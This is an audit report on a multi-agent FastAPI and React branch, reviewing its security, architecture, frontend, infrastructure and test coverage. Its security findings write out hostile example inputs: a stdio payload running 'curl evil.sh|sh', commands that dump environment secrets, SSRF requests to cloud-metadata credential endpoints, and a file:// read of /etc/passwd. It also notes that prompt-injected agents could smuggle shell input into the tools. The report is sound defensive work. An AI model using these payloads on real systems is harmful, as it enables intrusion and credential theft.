# Audit Report — FUTURIST OS branch (`claude/jarvis-bauen-dqeyzd`)

**Date:** 2026-07-31
**Scope:** Full read-only review of the branch `origin/claude/jarvis-bauen-dqeyzd` (246 files, ~14,650 lines added vs. `main`), performed before any decision to merge into `main`. `main` was not modified.
**Methodology:** Five independent static reviews (security; backend architecture/quality; frontend quality; infra & documentation accuracy; test-suite honesty) run in parallel against a git worktree checkout of the branch, plus one attempt to actually execute the backend test suite.
**Status of "did it actually run":** Not verified by execution. `pytest` requires `python3.14-venv` (not installed in the audit sandbox, needs `sudo apt install python3.14-venv`) plus live Postgres+pgvector and Redis via Docker Compose, neither of which were available in the sandbox. This report is a thorough static read, not an execution proof. The test-suite-honesty section below assesses whether the *tests as written* would be meaningful if run, based on reading `conftest.py` and fixtures.

---

## Executive Summary

The branch is a substantial, largely non-superficial implementation of the FUTURIST OS vision: a multi-agent FastAPI backend, a React/TypeScript dashboard, Docker Compose infra, and supporting docs. Architecture, the multi-agent delegation model, the pgvector memory pipeline, and the test suite's rigor (real Postgres/Redis/Playwright/PTY, not mocks) are all genuinely above demo quality.

However, the branch contains **9 critical/high-severity security and deployment findings** that must be fixed before it is merged into `main` or exposed beyond a single operator's own machine. The most serious: the code's own comments assume "a single, trusted admin user," but the actual registration logic contradicts that by defaulting every new signup to role `member`, and `member` accounts currently have a path to remote code execution and full secrets exfiltration. See **Finding S1–S9**.

**Recommendation:** Fix the critical/high findings (see `FIX_PLAN.md`) before merging to `main`. The architecture does not need a rewrite — most fixes are targeted (RBAC gates, one missing SSRF-guard call, environment stripping, forcing required secrets at startup, a production frontend build).

---

## Table of Contents

1. [Security Audit](#1-security-audit)
2. [Backend Architecture & Code Quality](#2-backend-architecture--code-quality)
3. [Frontend Quality](#3-frontend-quality)
4. [Infra & Documentation Reality Check](#4-infra--documentation-reality-check)
5. [Test Suite Honesty Check](#5-test-suite-honesty-check)

---

## 1. Security Audit

**Overall verdict from this pass:** Not safe even for a single trusted admin the moment self-registration is enabled. The code's own docstrings admit "Phase 0 assumes a single, trusted admin user," but the actual RBAC (`auth.py:66-68` auto-assigns "member" to every signup after the first) contradicts that assumption: any self-registered member gets unauthenticated-strength RCE via MCP stdio config (S1) or the terminal tool (S2/S3), so this is **actively dangerous** as soon as it's exposed to more than one literal person. Even for a lone admin, the unguarded SSRF surfaces (S4–S6) and the default-secret risk (S8) are real production landmines.

### S1 — RCE via MCP server registration — any authenticated user
**Files:** `apps/api/app/api/v1/mcp.py:37-45`, `apps/api/app/schemas/mcp.py:9-13`, `apps/api/app/mcp/client.py:24-29`
`create_server` lets any logged-in user (default role `member`) set `transport="stdio"` with an arbitrary `command`/`args`. `list_server_tools` / tool-calling then runs `stdio_client(params)`, which `subprocess`-execs that command **on the API host**, with no allowlist and no admin check. A member simply POSTs `{"transport":"stdio","command":"/bin/bash","args":["-c","curl evil.sh|sh"]}` and calls `/servers/{id}/tools` to get full RCE.

### S2 — Secrets exfiltration via terminal env inheritance
**Files:** `apps/api/app/live/terminal_manager.py:44-52`, `apps/api/app/orchestrator/tools/sandbox.py`/`terminal.py:16-21`
Both the PTY session and the LLM's `run_terminal_command` tool spawn the shell with `{**os.environ, ...}` — the full process environment, including `JWT_SECRET_KEY`, `DATABASE_URL` (DB password), `ENCRYPTION_KEY`, `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `N8N_API_KEY`. Any user (or a prompt-injected agent) running `env` or `cat /proc/self/environ` dumps every secret the server holds — including the Fernet key that decrypts all stored MCP/Google secrets.

### S3 — Terminal/browser endpoints: zero RBAC and zero rate limiting
**Files:** `apps/api/app/api/v1/terminal.py`, `apps/api/app/api/v1/browser.py`
Only `get_current_user` is required — no `require_admin`, no `rate_limiter`. Rate limiting exists solely on `/auth/register` and `/auth/login` (`auth.py:59,88`; confirmed via repo-wide grep — no other endpoint uses it). Since self-registration defaults new accounts to `member` (`auth.py:66-68`), any signed-up member gets unlimited raw-shell and real-Chromium sessions with no throttling — a resource-exhaustion/crypto-mining vector as well as the RCE path in S1.

### S4 — `read_page` tool has no SSRF guard at all
**File:** `apps/api/app/orchestrator/tools/research.py:38-49`
Unlike `call_api` (which correctly calls `is_safe_url`), `read_page` fetches any URL with `httpx` and `follow_redirects=True` — no `ssrf_guard` import anywhere in the file. A tool call `read_page("http://169.254.169.254/latest/meta-data/iam/security-credentials/")` or `http://localhost:6379` reaches cloud-metadata/internal services directly; redirects aren't checked either.

### S5 — Browser `navigate` has no URL restriction, including `file://`
**File:** `apps/api/app/live/browser_manager.py:89-99`
The code explicitly leaves `file:`, `data:`, `about:` schemes untouched (comment: "must be left alone"). A tool call `navigate({"url":"file:///etc/passwd"})` followed by `screenshot` reads arbitrary host files through the rendered page; plain `http://169.254.169.254/...` navigation is uncontrolled SSRF via a full headless browser — worse than a bare fetch, since it executes JS, follows redirects, and can interact with internal admin UIs.

### S6 — MCP `sse` transport URL is unguarded
**File:** `apps/api/app/mcp/client.py:30-33`
`sse_client(server.url)` is called with no `is_safe_url` check. Combined with S1's lack of admin gating, any member can register an SSE MCP server pointing at `http://169.254.169.254/` or an internal service and pull results back through `list_tools`/`call_tool` — a second SSRF path independent of the guarded `call_api` tool.

### S7 — `ssrf_guard.py` is DNS-rebinding vulnerable (TOCTOU)
**File:** `apps/api/app/orchestrator/tools/ssrf_guard.py:18-30`
Resolves the hostname once via `socket.getaddrinfo`, validates those IPs, then returns a boolean; the actual `httpx` request re-resolves DNS independently when connecting. An attacker-controlled domain with a low TTL can return a public IP for the guard's check and a private/loopback IP moments later for the real connection — the guard never pins the validated IP for the subsequent request.

### S8 — Default/weak JWT secret shipped as a literal default
**File:** `apps/api/app/core/config.py:25`
`JWT_SECRET_KEY: str = "change-me-in-.env"`. If `ENV=production` is deployed without overriding this (nothing in code enforces it), tokens are forgeable by anyone who knows the public default string — full auth bypass including forging `role: admin` claims (`auth.py:41` embeds role directly in the JWT with no server-side re-check of role changes until next login).

### S9 — `ENCRYPTION_KEY` silently defaults to plaintext storage
**File:** `apps/api/app/core/crypto.py:21-26,39-44`
If unset, `encrypt()`/`decrypt()` become no-ops with only a one-time log warning — MCP server env secrets and (per `google_account.py`) OAuth tokens would be stored in cleartext in Postgres with no hard failure. Easy to miss since `.env.example` also ships `ENCRYPTION_KEY=` empty.

### Additional lower-severity security findings

- **S10 — JWT passed as a WebSocket query parameter** (`apps/api/app/ws/terminal.py:22`, likely `ws/browser.py` too). Access tokens end up in server access logs, proxy logs, and browser history.
- **S11 — No refresh-token reuse detection beyond single-use rotation** (`apps/api/app/api/v1/auth.py:111-129`). A stolen refresh token used before the legitimate client's next refresh succeeds silently, with no alerting or session-family invalidation.
- **S12 — `run_terminal_command` uses `asyncio.create_subprocess_shell`** (`apps/api/app/orchestrator/tools/terminal.py:16`). Intentional per the feature, but combined with S2/S3, any prompt-injected content the agent reads (e.g. from `read_page` or an MCP tool result) can smuggle shell metacharacters into a later terminal call — no output/argument sanitization layer.
- **S13 — CORS `allow_credentials=True`** (`apps/api/app/main.py:31-33`) paired with a configurable, unvalidated `CORS_ORIGINS` list. Not wildcarded by default, but nothing prevents an operator from setting `CORS_ORIGINS=["*"]` in production, which combined with credentials is unsafe.

---

## 2. Backend Architecture & Code Quality

**Overall verdict:** Meaningfully above demo/scaffold quality. Multi-agent delegation is real (distinct tools per specialist, actual external calls — DuckDuckGo, DALL-E, ReportLab, n8n, SSRF-guarded HTTP), the memory system uses genuine pgvector cosine search with sensible relevance filtering, migrations are drift-free, and security-sensitive paths (calculator, workspace sandboxing, SSRF) are implemented correctly and self-aware about their own limitations in code comments. The main gaps are a missing delegation-depth guard (currently safe only by seed-data convention, not by code) and some business logic sitting in the WebSocket layer instead of a service module. Reads as an early-but-serious, explicitly self-labeled "Phase 0/1" codebase.

1. **Delegation has no recursion/depth guard** (moderate). `orchestrator/tools/delegate.py:14-15` only blocks `agent_slug == "executive"`; nothing in `ToolContext` or `run_agent_turn` tracks delegation depth. Safe today only because seed data (`scripts/seed.py`) gives `delegate_to_agent` exclusively to the Executive agent — a data convention, not an enforced invariant.
2. **Tool-call loop termination is correct and honest about its limits.** `run_agent_turn` bounds iterations at `MAX_TOOL_ITERATIONS = 6` (`orchestrator/runner.py:28,85-97`), returns cleanly on no-tool-calls, and on exhaustion returns a user-facing message rather than crashing. `execute_tool` wraps every handler in try/except so one tool failure becomes text fed back to the model instead of killing the turn.
3. **No token-budget limiting, only step-count limiting.** Nothing caps cumulative tokens across the 6 iterations; mitigated by a fixed `max_tokens=2048` per response but doesn't address input-side growth.
4. **Delegation is a real, differentiated multi-agent architecture, not window dressing.** Each of the 6 specialists has genuinely distinct tools and prompts (`scripts/seed.py:68-139`): Developer gets sandboxed file/terminal tools, Research does real DuckDuckGo scraping + page-reading, Design calls actual DALL-E 3, Finance builds real PDF invoices via ReportLab, Marketing does real on-page SEO analysis, Automation does SSRF-guarded HTTP + n8n webhooks. Delegation reuses `run_agent_turn` itself — clean, non-superficial recursive design.
5. **Embedding provider fallback can silently degrade production quality.** `registry.get_embedding_provider()` transparently falls back to `FakeEmbeddingProvider` (hashed bag-of-words) whenever `OPENAI_API_KEY` is unset — a deliberate, documented fallback, not a mock. Importantly, chat's `FakeProvider`/`ScriptedToolProvider` are NOT reachable via `get_provider()` (only real Anthropic/OpenAI/Ollama), so chat can't silently go fake. But memory search quality can silently degrade to keyword overlap with no startup warning if `OPENAI_API_KEY` is forgotten.
6. **pgvector memory pipeline is logically sound.** Word-based chunking with configurable overlap, correct step math, no off-by-one truncation. Ingestion and fact storage embed then persist in one transaction. Search uses genuine `cosine_distance`, scoped by `user_id`, with a `_RELEVANCE_THRESHOLD = 0.9` before context is surfaced to the model — avoids the common bug of always injecting top-k regardless of relevance.
7. **Migrations are consistent with models, no drift.** Seven Alembic revisions form one clean linear chain. `EMBEDDING_DIM = 1536` is centralized and referenced consistently, avoiding a dimension-mismatch bug class.
8. **Calculator tool is genuinely safe, not `eval()` dressed up.** Parses via `ast.parse` and whitelists only arithmetic AST node types/operators — no code execution surface.
9. **Sandbox/SSRF guards are honest about being partial.** `sandbox.py:1-8` explicitly documents workspace confinement is directory-level only ("no container, no seccomp") under a stated single-trusted-user assumption. `resolve_in_workspace` correctly guards path traversal with `normpath` + prefix check.
10. **REST routes are thin and consistent.** Representative example `conversations.py`: routes do auth via dependency injection, ownership checks via a shared helper, and delegate persistence/query logic straight to SQLAlchemy — no orchestration logic leaks into handlers.
11. **WebSocket chat handler duplicates orchestration logic that arguably belongs in a service module.** `ws/chat.py:33-57` (`_stream_reply`) contains the has-tools branch, memory-context wiring, and word-by-word re-chunking of non-streaming tool replies — will need duplicating if a second transport is added later.
12. **Hardcoded `max_tokens=2048` on both streaming and tool-calling paths.** Minor scalability constraint; long PDF-report generation or multi-file code tasks could get truncated with no per-agent configurability.

---

## 3. Frontend Quality

**Overall verdict:** A competently-built frontend with real engineering maturity in the boring-but-critical places (token refresh concurrency, no `any` abuse, sensible component structure, current dependency versions — React 19, Vite 8, TS 6). It falls short on production-hardening for its most novel and highest-risk surfaces: the live terminal/browser features have no reconnection or parse-safety net, and the terminal hands raw shell access to the UI with no client-side guardrail, leaning entirely on an unverified backend sandbox.

1. **(High) No reconnection logic on any WebSocket connection.** `lib/chat-socket.ts:9-26`, `BrowserPage.tsx:34-44`, `TerminalPage.tsx:38-52` all open a raw `WebSocket` with no `onclose`-triggered retry/backoff. A dropped connection silently ends the session with no recovery path.
2. **(High) Unguarded `JSON.parse(event.data)` in all three socket handlers.** `chat-socket.ts:19`, `BrowserPage.tsx:38`, `TerminalPage.tsx:42` — no try/catch, no schema validation. A malformed frame throws inside the event handler uncaught; session state can get stuck (e.g. `status: 'sending'` forever).
3. **(Medium) Terminal keystrokes are piped straight to the shell with zero client-side guardrail.** `TerminalPage.tsx:49-51` — `term.onData` sends every character directly over the socket, no confirmation, no destructive-command detection. The code comment says "sandboxed shell" — worth confirming that server-side sandbox is actually airtight (see S2/S3), since the UI provides no safety net at all.
4. **(Medium) Refresh token stored in `localStorage`.** `auth-store.ts:5,51,72,88,104` — readable by any injected script. Access token is correctly memory-only, limiting blast radius, but a single XSS is enough to steal the long-lived refresh token indefinitely.
5. **(Medium) Access tokens passed as WebSocket query params.** Unavoidable given the WebSocket API can't set custom headers, but means live tokens land in server/proxy access logs (same root cause as S10).
6. **(Medium) Zero accessibility attributes anywhere in `app/*.tsx`.** No `aria-`/`role=` across 15 page components. Icon-only buttons (e.g. the mic toggle in `ChatPage.tsx:190-197`) have no `aria-label`; status updates aren't in a live region.
7. **(Medium) No error boundary anywhere.** `App.tsx`/`main.tsx` wrap the tree in `StrictMode` only. Any uncaught render exception white-screens the entire app.
8. **(Strength) Genuinely solid token-refresh concurrency handling.** `auth-store.ts:10,84-113` — `inFlightRefresh` promise dedup with an explicit comment explaining why (StrictMode double-invoke, multi-tab races against single-use rotating refresh tokens) — correctly-implemented real-world auth engineering.
9. **(Strength) Type safety is clean.** Zero `: any` / `as any` hits repo-wide. Typed discriminated unions (`ServerEnvelope`, `TokenPair`, `User`) drive the socket and auth code.
10. **(Low) Hardcoded German UI strings scattered inline, no i18n layer.** Fine if German-market-only by design, but no abstraction if other-locale support is ever needed.

---

## 4. Infra & Documentation Reality Check

**Overall verdict:** A developer following the docs literally would get partway to a working dev environment (compose, env vars, migrations, health checks all check out) but would get stuck at the first real "go live" attempt: the web container never produces a production build, and the documented reverse-proxy setup will plausibly break against Vite's dev-server host allowlisting. The architecture doc's own stated safety rationale (isolate Chromium in a worker) was quietly abandoned without updating the doc. Deployable for solo local/LAN use; not yet for the "VPS behind TLS" scenario `DEPLOYMENT.md` describes.

1. **(High) Web "production" deployment never runs a production build.** `apps/web/Dockerfile:12` CMD is `npm run dev -- --host 0.0.0.0 --port 5173`. A real `build` script exists (`tsc -b && vite build`, documented in `apps/web/README.md:17-20`) but `docker-compose.yml`'s `web` service never calls it. Production traffic would be served by the Vite dev server, not static assets.
2. **(High) That dev server will likely reject the exact reverse-proxy setup `DEPLOYMENT.md` prescribes.** `vite.config.ts` sets no `server.allowedHosts`, and Vite is pinned to `^8.1.1` which enforces Host-header allowlisting by default. `DEPLOYMENT.md` §4 has you front it with Caddy/nginx on a real domain — Vite will likely respond "Blocked request. This host is not allowed."
3. **(High) Architecture doc's stated rationale for isolating Chromium was dropped, docs not updated.** §1.3(e) recommends a separate Browser-Worker container "because Chromium instances are resource-intensive and potentially unstable — that must not be able to take down the main API." The implementation embeds Playwright/Chromium directly in the API process, with no `workers/` directory, no queue, no separate container. The exact risk the plan called out is now live in production.
4. **(Medium) Neither Dockerfile sets a non-root `USER`.** Both `apps/api/Dockerfile` and `apps/web/Dockerfile` run as root — standard hygiene gap.
5. **(Medium) `restore.sh`'s "overwrites the database completely" warning is inaccurate.** `infra/scripts/restore.sh:31` prompts that it overwrites completely, but pipes the dump into `psql` against a live DB without `--clean`/`--if-exists` or a drop/recreate step — against a non-empty target it will likely fail with "relation already exists" rather than cleanly overwrite.
6. **(Strength) Config/env/compose wiring is genuinely consistent.** `docker-compose.yml`'s `DATABASE_URL`/`REDIS_URL` overrides match `config.py` defaults and `.env.example` exactly; `docker-entrypoint.sh` runs migrations + seed automatically as documented; `/api/v1/health` returns exactly what `GO_LIVE_CHECKLIST.md` promises; `/api/v1/audit-logs` exists as claimed.
7. **(Strength) `backup.sh`/`restore.sh` are otherwise safe and well-reasoned.** Compressed timestamped pg_dump + forced Redis SAVE+copy, explicit y/N confirmation, and a documented, deliberate choice not to auto-restore Redis (cache/pub-sub state only).
8. **(Medium) Architecture doc's planned folder structure doesn't match the tree.** §2 promises `app/agents/{name}/` per-agent folders; actual code uses flat `app/orchestrator/tools/*.py`. Functionally equivalent, but misleading for anyone navigating by the doc.
9. **(Minor) All deployment-critical docs are German-only** (`DEPLOYMENT.md`, `GO_LIVE_CHECKLIST.md`, root `README.md`, `jarvis/README.md`) — inconsistent with English code/comments, a friction point for broader contributors.
10. **(Minor) FUTURIST OS and `jarvis/` overlap in capability but not in code.** Both do voice control and Playwright browser automation independently, each with separate `.env` files and separate Claude wiring — unaddressed duplicated effort, not an integration, though the README does label Jarvis clearly as a separate prototype.

---

## 5. Test Suite Honesty Check

**Verdict:** The branch's own claim of "all 11 phases implemented" with a full test suite is **mostly honest but overstated**. `conftest.py` confirms tests hit real Postgres (with pgvector) and real Redis — only the LLM provider is faked (`ScriptedToolProvider`/`FakeEmbeddingProvider`), which is a legitimate, documented boundary, not a shortcut. This is not theater for what it covers. But two entire tool modules and one orchestrator tool have **zero** test coverage, and several others only test the negative/error branch.

### Coverage table

| Subsystem | Status | Evidence |
|---|---|---|
| Auth (register/login/refresh/logout) | Meaningful | `test_auth.py` — real token rotation/reuse-rejection asserted |
| Terminal WS/PTY | Meaningful | `test_terminal.py:36-55` sends real data over a real WS/PTY and reads it back |
| `run_terminal_command` orchestrator tool | **Untested** | zero references in `tests/` |
| Browser/Playwright | Meaningful | `test_browser.py` decodes real PNG magic bytes from screenshots |
| SSRF guard | Meaningful but narrow | `test_ssrf_guard.py` unit-tests `is_safe_url` directly (5 cases: loopback, private ranges, metadata, non-http schemes) but not integrated through every call site (see S4/S6) |
| Crypto (Fernet) | Meaningful | roundtrip, plaintext-fallback, invalid-token-doesn't-crash all covered |
| MCP | Meaningful and real | `test_mcp.py` spawns a real stdio MCP server (`fixtures/echo_mcp_server.py`) and exercises the real wire protocol |
| Rate limiting / audit log | Meaningful | drives real Redis-backed limiter to 429, asserts audit entries |
| `calculate` tool | Shallow | `safe_eval` unit-tested directly, but the registered tool wrapper is never invoked via `execute_tool` |
| calendar_email | Meaningful | full read/create/list/send flow, fakes only at the Google API boundary |
| delegate | Meaningful | real inter-agent delegation + self-delegation refusal tested |
| files (tool) | Meaningful | read/write roundtrip + path-traversal rejection |
| finance (invoices/reports) | Meaningful | asserts real PDF bytes and computed totals |
| marketing (`seo_analyze`) | Shallow | only the unreachable-URL error path tested |
| automation (n8n, `call_api`) | Shallow | only not-configured/SSRF-rejected paths; no working n8n call ever exercised |
| design (`generate_image`) | Shallow | only the "no API key" error path tested |
| memory (`read_memory`) | **Untested** | zero references in `tests/`, despite search being exercised indirectly elsewhere |
| research (`web_search`, `read_page`) | **Untested** | zero references in `tests/` |
| tasks | Meaningful | create + unknown-project rejection tested |
| sandbox.py | Indirectly covered | only via `files.py` tests |

### Notable gaps
1. `orchestrator/tools/research.py` (`web_search`, `read_page`) — completely untested. This is also the tool with the S4 SSRF hole — the most exposed, least-tested code in the branch.
2. `orchestrator/tools/memory.py:23` (`read_memory`) — completely untested despite being a core "agent memory" phase.
3. `orchestrator/tools/terminal.py:36` (`run_terminal_command`) — untested; only the separate WS/PTY session code path is tested.
4. `design`/`automation` (n8n) — only negative branches tested; the actual success path (real image generation, real n8n trigger) is never exercised.
5. `marketing.py`'s `seo_analyze` — only tests the unreachable-URL branch; parsing logic on a real page is unverified.
6. `finance.py:128` (`calculate` tool registration) — only the underlying `safe_eval` is unit-tested; the tool wrapper's argument parsing/error formatting is unverified.
7. **Positive:** `fixtures/echo_mcp_server.py` is a real, minimal MCP server using the actual `mcp` SDK types, spawned as a subprocess in `test_mcp.py` — genuine integration testing, not a stub.
